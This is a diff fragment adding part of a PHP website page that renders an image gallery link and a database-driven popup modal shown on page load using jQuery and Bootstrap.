+                                <a class="project-link" href="backend_Admin_shikshaMadhav/<?php echo  $dataBlog['image']; ?>"><i class="fal fa-plus"></i></a>
+                              <!--   <h6><a href="gallery.html">Milk Gallon </a></h6>
+                                <span><a href="single-gallery.html">category : Butter</a></span> -->
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+            <?php } ?>
+                <!-- End: Work Item 6 -->
+                 <div class="col-md-12" style="text-align:center;"> <a href="gallery.php" class="ser-link" style="
+    margin-top: 0px;
+    margin-bottom: 19px;
+width: 100px;border:1px solid #e6760f;">View All <i class="far fa-chevron-double-right"></i></a>
+</div>
+            </div>
+            <!--/.row -->
+        </div>
+        <!--/.container -->
+    </section>
+    
+    <style type="text/css">
+	.modal {z-index: 99999;}
+	.modal .modal-body {
+    padding: 0px;
+}
+.modal-header {
+    background: #709322;
+    padding: 2px 5px;
+    border-radius: 0px;
+    display: block;
+}
+.modal-footer {padding: 0px;}
+}
+.close {
+    color: #ffffff;
+    float: right;
+    font-size: 18px;
+    font-weight: 500;
+    line-height: 20px;
+    border: 0px;
+    opacity: 1;
+    background-color: #fff0!important;
+    text-shadow: none;
+    vertical-align: middle;
+}
+
+@media (max-width: 575.98px) { .modal {
+   
+    top: 0%;
+
+} }
+
+</style>
+
+   
+         <?php 
+
+$GetRows="select * from popup where `status` = 'Active'";
+$exe=mysqli_query($mysqli,$GetRows);
+while($data = mysqli_fetch_array($exe))
+{
+
+	?> 
+
+<div class="container">
+
+  <!-- Modal -->
+  <div class="modal fade" id="onload" tabindex="-1" aria-labelledby="exampleModalLabel" aria-hidden="true"> <!-- Add this line to your code -->
+    <div class="modal-dialog modal-dialog-centered">
+        
+        <div class="modal-content">
+            <div class="modal-header text-center" style="background-color:#e6760f;padding:10px">
+                <?php echo $data['popup_title'];?>
+            </div>
+          
+            <div class="modal-body">
+               <center><img src="backend_Admin_shikshaMadhav/uploads/popup/<?php echo $data['popup_file'];?>" alt="<?php echo $data['popup_title'];?>"> </center>
+            </div>
+            <div class="modal-footer">
+                <button type="button" class="btn btn-secondary btn-sm" data-bs-dismiss="modal">Close</button>
+            </div>
+        </div>
+    </div>
+</div>
+</div>   
+   
+<?php } ?>
+
+<!-- import jquery -->
+<script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>
+<!-- Bootstrap Bundle with Popper -->
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js" integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM" crossorigin="anonymous"></script>
+
+<!--Modal JS Script -->
+<script type="text/javascript">
+    window.onload = () => {
+        $('#onload').modal('show');
+    }
+</script>
+
+
+
+
+<?php include "includes/footer.php"; ?>
